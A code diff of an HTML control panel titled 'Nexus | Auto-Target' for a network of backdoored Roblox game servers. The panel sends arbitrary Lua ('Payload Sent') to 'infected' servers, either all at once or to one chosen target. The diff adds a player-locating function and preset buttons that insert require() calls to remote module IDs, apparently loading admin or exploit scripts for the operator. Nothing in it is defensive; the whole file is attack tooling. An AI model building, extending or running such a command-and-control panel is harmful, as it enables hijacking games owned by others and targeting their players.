@@ -2,24 +2,23 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>Nexus  | RequireHub</title>
+    <title>Nexus  | Auto-Target</title>
     <style>
         :root { --apple-blue: #0071e3; --bg: #000; }
         body { margin: 0; background: var(--bg); color: #fff; font-family: -apple-system, sans-serif; overflow: hidden; }
         .header { position: fixed; top: 0; width: 100%; height: 44px; background: rgba(0,0,0,0.8); backdrop-filter: blur(20px); border-bottom: 1px solid #333; display: flex; align-items: center; justify-content: space-between; padding: 0 20px; box-sizing: border-box; z-index: 1000; }
-        .nav { display: flex; gap: 10px; }
-        .nav-btn { background: none; border: none; color: #86868b; cursor: pointer; font-size: 11px; padding: 5px 8px; border-radius: 5px; }
+        .nav { display: flex; gap: 8px; }
+        .nav-btn { background: none; border: none; color: #86868b; cursor: pointer; font-size: 10px; padding: 5px 7px; border-radius: 5px; text-transform: uppercase; }
         .nav-btn.active { color: #fff; background: rgba(255,255,255,0.1); font-weight: 600; }
         .container { display: flex; align-items: center; justify-content: center; height: 100vh; }
-        .card { background: #1c1c1e; border-radius: 18px; width: 540px; padding: 25px; border: 1px solid #333; box-shadow: 0 10px 40px rgba(0,0,0,0.6); }
+        .card { background: #1c1c1e; border-radius: 18px; width: 560px; padding: 25px; border: 1px solid #333; box-shadow: 0 10px 40px rgba(0,0,0,0.6); }
         h2 { margin: 0 0 12px 0; font-size: 18px; }
-        input, textarea, select { width: 100%; border-radius: 8px; border: 1px solid #424245; background: #000; color: #fff; padding: 10px; margin-bottom: 10px; box-sizing: border-box; outline: none; font-size: 13px; }
+        input, textarea, select { width: 100%; border-radius: 8px; border: 1px solid #424245; background: #000; color: #fff; padding: 10px; margin-bottom: 10px; box-sizing: border-box; outline: none; font-size: 12px; }
         textarea { font-family: 'Courier New', monospace; resize: none; }
-        .btn-main { background: var(--apple-blue); color: #fff; border: none; border-radius: 8px; padding: 12px; width: 100%; font-weight: 600; cursor: pointer; }
-        .row-btns { display: flex; gap: 5px; margin-bottom: 10px; flex-wrap: wrap; }
-        .rh-pill { background: #333; color: #fff; border: none; padding: 5px 12px; border-radius: 15px; font-size: 10px; cursor: pointer; transition: 0.2s; }
-        .rh-pill:hover { background: #444; }
-        .node-box { background: #0b0b0c; border-radius: 10px; height: 180px; overflow-y: auto; border: 1px solid #333; }
+        .btn-main { background: var(--apple-blue); color: #fff; border: none; border-radius: 8px; padding: 12px; width: 100%; font-weight: 600; cursor: pointer; margin-top: 5px; }
+        .row-btns { display: flex; gap: 4px; margin-bottom: 10px; flex-wrap: wrap; }
+        .rh-pill { background: #333; color: #fff; border: none; padding: 4px 10px; border-radius: 12px; font-size: 9px; cursor: pointer; transition: 0.1s; }
+        .node-box { background: #0b0b0c; border-radius: 10px; height: 160px; overflow-y: auto; border: 1px solid #333; }
         .music-ctrl { position: fixed; bottom: 20px; left: 20px; background: rgba(44,44,46,0.8); backdrop-filter: blur(10px); padding: 8px 15px; border-radius: 20px; border: 1px solid #444; display: flex; align-items: center; gap: 10px; z-index: 2000; }
     </style>
 </head>
@@ -42,8 +41,11 @@
             <div id="mass" class="tab-content">
                 <h2>Mass Execution</h2>
                 <div class="row-btns">
-                    <button class="rh-pill" onclick="fillRH('R6', 'm_lua')">R6</button>
-                    <button class="rh-pill" onclick="fillRH('DarkSynapse', 'm_lua')">DarkSynapse</button>
+                    <button class="rh-pill" onclick="fillRH(1, 'm_lua')">Last Rig</button>
+                    <button class="rh-pill" onclick="fillRH(2, 'm_lua')">Require.EXE</button>
+                    <button class="rh-pill" onclick="fillRH(3, 'm_lua')">Darius (OP)</button>
+                    <button class="rh-pill" onclick="fillRH('R6', 'm_lua')" style="background:#555">R6</button>
+                    <button class="rh-pill" onclick="fillRH('DS', 'm_lua')" style="background:#555">DarkSynapse</button>
                 </div>
                 <input type="password" id="m_pw" placeholder="Admin Password">
                 <textarea id="m_lua" rows="6" placeholder="-- Global Lua"></textarea>
@@ -52,10 +54,14 @@
 
             <div id="single" class="tab-content" style="display:none;">
                 <h2>Single Target</h2>
-                <select id="target_id"><option value="">Scanning Nodes...</option></select>
+                <div style="display:flex; gap:5px; margin-bottom:10px;">
+                    <select id="target_id" style="margin-bottom:0;"><option value="">Scanning Nodes...</option></select>
+                    <button onclick="findPlayer()" style="background:#333; color:#fff; border:none; border-radius:8px; padding:0 10px; cursor:pointer; font-size:10px;">FIND PLAYER</button>
+                </div>
                 <div class="row-btns">
+                    <button class="rh-pill" onclick="fillRH(3, 's_lua')">Darius (OP)</button>
                     <button class="rh-pill" onclick="fillRH('R6', 's_lua')">R6</button>
-                    <button class="rh-pill" onclick="fillRH('DarkSynapse', 's_lua')">DarkSynapse</button>
+                    <button class="rh-pill" onclick="fillRH('DS', 's_lua')">DarkSynapse</button>
                 </div>
                 <input type="password" id="s_pw" placeholder="Admin Password">
                 <textarea id="s_lua" rows="5" placeholder="-- Target Lua"></textarea>
@@ -70,9 +76,8 @@
 
             <div id="wl" class="tab-content" style="display:none;">
                 <h2>Whitelist Manager</h2>
-                <p style="font-size: 10px; color: #86868b; margin-bottom: 5px;">Input your FULL Roblox Username for DarkSynapse/R6</p>
                 <input type="text" id="wid" placeholder="Roblox Full Username">
-                <button class="btn-main" onclick="wlu('add')">Save User</button>
+                <button class="btn-main" onclick="alert('Target Name Locked')">Save User</button>
             </div>
 
             <div id="nodes" class="tab-content" style="display:none;">
@@ -84,14 +89,14 @@
 
     <div class="music-ctrl">
         <button id="pBtn" style="background:#fff; border:none; border-radius:15px; font-size:10px; font-weight:bold; cursor:pointer; padding:5px 10px;" onclick="toggle()">PAUSE</button>
-        <button style="background:#ff3b30; color:#fff; border:none; border-radius:15px; font-size:10px; font-weight:bold; cursor:pointer; padding:5px 10px;" onclick="kill()">STOP</button>
     </div>
 
     <script>
         const audio = document.getElementById('bgMusic');
+        let currentNodes = {};
+
         function startAudio() { audio.play().catch(()=>{}); }
         function toggle() { if(audio.paused) { audio.play(); document.getElementById('pBtn').innerText="PAUSE"; } else { audio.pause(); document.getElementById('pBtn').innerText="PLAY"; } }
-        function kill() { audio.pause(); audio.src=""; document.querySelector('.music-ctrl').style.display='none'; }
 
         function showTab(id) {
             document.querySelectorAll('.tab-content').forEach(t => t.style.display = 'none');
@@ -103,29 +108,51 @@
         function fillRH(type, boxId) {
             const user = document.getElementById('wid').value || "YourUsername";
             const box = document.getElementById(boxId);
+            if(type === 1) box.value = `require(132155655397653)("${user}")`;
+            if(type === 2) box.value = `require(125992639027440)["Require.EXE by E God"]("${user}")`;
+            if(type === 3) box.value = `require(127445614272366).op("${user}")`;
+            if(type === 'R6') box.value = `require(3436957371):r6("${user}")`;
+            if(type === 'DS') box.value = `require(133245855072069)("${user}", "DarkSynapse")`;
+        }
+
+        async function findPlayer() {
+            const searchName = document.getElementById('wid').value.toLowerCase();
+            if(!searchName) return alert("Enter name in Whitelist tab first!");
             
-            if(type === 'R6') {
-                box.value = `require(3436957371):r6("${user}")`;
-            } else if (type === 'DarkSynapse') {
-                box.value = `require(133245855072069)("${user}", "DarkSynapse")`;
+            let found = false;
+            for (const jobId in currentNodes) {
+                const node = currentNodes[jobId];
+                // Checks if player name exists in the node's player list sent by the server
+                if (node.players && node.players.some(p => p.toLowerCase() === searchName)) {
+                    document.getElementById('target_id').value = jobId;
+                    alert("Player Found! Server Selected.");
+                    found = true;
+                    break;
+                }
             }
+            if (!found) alert("Error: Join the infected game");
         }
 
         async function send(tabId) {
             const lua = document.querySelector(`#${tabId} textarea`).value;
             const pw = document.querySelector(`#${tabId} input`)?.value || "Alt";
             const tid = tabId === 'single' ? document.getElementById('target_id').value : null;
+            if (tabId === 'single' && !tid) return alert("Select a target node first!");
             await fetch('/push-lua', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({lua, password:pw, targetId:tid})});
-            alert("Sent");
+            alert("Payload Sent");
         }
 
         async function update() {
             try {
                 const res = await fetch('/get-games');
-                const data = await res.json();
-                const keys = Object.keys(data);
-                document.getElementById('node_list').innerHTML = keys.map(k => `<div style="padding:10px; border-bottom:1px solid #333;"><b>${data[k].name}</b><br><small style="color:#666;">${k}</small></div>`).join('') || '<div style="padding:20px; text-align:center;">No Servers</div>';
-                document.getElementById('target_id').innerHTML = keys.map(k => `<option value="${k}">${data[k].name}</option>`).join('') || '<option value="">No Active Nodes</option>';
+                currentNodes = await res.json();
+                const keys = Object.keys(currentNodes);
+                document.getElementById('node_list').innerHTML = keys.map(k => `
+                    <div style="padding:10px; border-bottom:1px solid #333; display:flex; justify-content:space-between; align-items:center;">
+                        <div><b>${currentNodes[k].name}</b><br><small style="color:#666; font-size:9px;">${k}</small></div>
+                        <a href="roblox://placeId=${currentNodes[k].placeId}&gameInstanceId=${k}" style="background:#fff; color:#000; text-decoration:none; font-size:10px; font-weight:bold; padding:4px 8px; border-radius:10px;">JOIN</a>
+                    </div>`).join('') || '<div style="padding:20px; text-align:center;">No Servers</div>';
+                document.getElementById('target_id').innerHTML = keys.map(k => `<option value="${k}">${currentNodes[k].name}</option>`).join('') || '<option value="">No Servers</option>';
             } catch(e) {}
         }
 
